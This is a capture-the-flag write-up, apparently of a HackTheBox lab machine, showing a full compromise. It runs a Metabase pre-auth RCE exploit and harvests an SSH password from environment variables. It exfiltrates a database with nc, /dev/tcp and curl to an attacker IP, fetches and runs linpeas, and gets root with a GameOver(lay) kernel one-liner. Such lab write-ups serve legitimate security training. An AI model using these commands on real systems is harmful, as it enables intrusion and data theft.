---
layout: post
title: "analytics"
date: 2026-03-03 
categories: OSCP Playlist
---
# analytics

# Summary

- find metabase subdomain
- open-source application; find version information; filter with jq
- version vulnerable to RCE, public exploit available; RCE onto docker as user metabase
- environment variable reveal ssh password for user metalyitics
- enumerate host version; kernel 6.2.0-25-generic Ubuntu 22.04 vulnerable to CVE-2023-2640 + CVE-2023-32629 "GameOver(lay)"
- exploit one-liner to get root

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/analytics 10.129.229.224

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let’s add the domain name to our /etc/hosts file.

![image.png]({{ site.baseurl }}/assets/analytics/image.png)

There is a contact form:

![image.png]({{ site.baseurl }}/assets/analytics/image%201.png)

Does not work. Clicking on the hyperlink login, we get redirected to a subdomain data.analytical.htb. Let’s add the new subdomain to our /etc/hosts file.

![image.png]({{ site.baseurl }}/assets/analytics/image%202.png)

This is a metabase application. 

Metabase is an open-source business intelligence (BI) and data analytics tool. It lets users query databases and visualize data without needing to write SQL (though you can if you want).

Let’s try to identify the version being used:

```bash
curl -s http://data.analytical.htb/api/session/properties | jq '.version'

{
  "date": "2023-06-29",
  "tag": "v0.46.6",
  "branch": "release-x.46.x",
  "hash": "1bb88f5"
}

```

Searching up exploits relating to the version, we find this: 

https://www.exploit-db.com/exploits/51797

Let’s download the python exploit and run it:

```bash
python3 exploit.py 
                                        
[*] Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]
usage: exploit.py [-h] -l  -p  -P  -u 
exploit.py: error: the following arguments are required: -l/--lhost, -p/--lport, -P/--sport, -u/--url
```

```bash
python3 exploit.py -l 10.10.16.214 -p 4444 -P 80 -u http://data.analytical.htb
```

![image.png]({{ site.baseurl }}/assets/analytics/image%203.png)

We now have RCE. 

Let’s get a proper shell by injecting our public key in metabase’s home directory. 

```bash
#Let's create a ssh key on attack host
ssh-keygen -f metabase
cat metabase.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMmyyLjlkoPxMx5g8mYWV45CfmIG/pZ8L70aAvwJO+7N kali@kali

#Now cat the content and echo it to authorized_keys on target host
mkdir /home/metabase/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMmyyLjlkoPxMx5g8mYWV45CfmIG/pZ8L70aAvwJO+7N kali@kali" >> /home/metabase/.ssh/authorized_keys

#Now we try to login:
chmod 600 metabase #change to secure permission to allow use of private key

ssh -i metabase metabase@10.129.229.224

```

Something wrong with echo. Let’s upload the file:

```bash
python3 -m http.server 8000

#on target
wget http://10.10.16.214:8000/metabase.pub -O /home/metabase/.ssh/authorized_keys
```

Now let’s try ssh. Still does not work. Checking the IP address; we are in a docker… should’ve checked first. 

```bash
metabase_shell > ifconfig

eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3438 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5864 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:299578 (292.5 KiB)  TX bytes:5839497 (5.5 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

```

Checking out the environment variables, we find password. 

```bash
env 

SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=4c6ef4ac26ae
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=2
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Let’s try ssh in with the credentials:

```bash
ssh metalytics@10.129.229.224 #An4lytics_ds20223#
```

It worked. 

Before we move on, let’s also get the metabase.db/metabase.db.mv.db

```bash
#Listener Linux:

nc -lnvp 1234  > metabase.db.mv.db

#target linux
nc 10.10.16.214 1234 -q0 < metabase.db/metabase.db.mv.db

cat  metabase.db/metabase.db.mv.db > /dev/tcp/10.10.16.214/1234
```

Does not work. Let’s  use uploadserver:

```bash
uploadserver 8000
```

On target:

```bash
curl -F "files=@metabase.db/metabase.db.mv.db" http://10.10.16.214:8000/upload
```

Does not work. 

Let’s just move on. Let’s check our privileges:

```bash
sudo -l
[sudo] password for metalytics: 
Sorry, user metalytics may not run sudo on localhost.

id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
```

Let’s run linpeas.

```bash
#on host
python3 -m http.server 8000

#on target
cd /tmp
wget http://10.10.16.214:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Interesting outputs:

```bash
                              ╔════════════════════╗                                                                                           
══════════════════════════════╣ System Information ╠══════════════════════════════                                                             
                              ╚════════════════════╝                                                                                           
╔══════════╣ Operative system                                                                                                                  
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                              
Linux version 6.2.0-25-generic (buildd@lcy02-amd64-044) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils 
for Ubuntu) 2.38) #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2                                                             
Distributor ID: Ubuntu                                                                                                                         
Description:    Ubuntu 22.04.3 LTS                                                                                                             
Release:        22.04                                                                                                                          
Codename:       jammy                                                                                                                          
                                                                                                                                               
╔══════════╣ Sudo version                                                                                                                      
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                 
Sudo version 1.9.9  

╔══════════╣ Unix Sockets Analysis                                                                                                             
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                      
/run/containerd/containerd.sock                                                                                                                
/run/containerd/containerd.sock.ttrpc                                                                                                          
/run/dbus/system_bus_socket                                                                                                                    
  └─(Read Write (Weak Permissions: 666) )                                                                                                      
  └─(Owned by root)                                                                                                                            
  └─High risk: root-owned and writable Unix socket   
```

![image.png]({{ site.baseurl }}/assets/analytics/image%204.png)

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -p")'
```

![image.png]({{ site.baseurl }}/assets/analytics/image%205.png)

We are now root.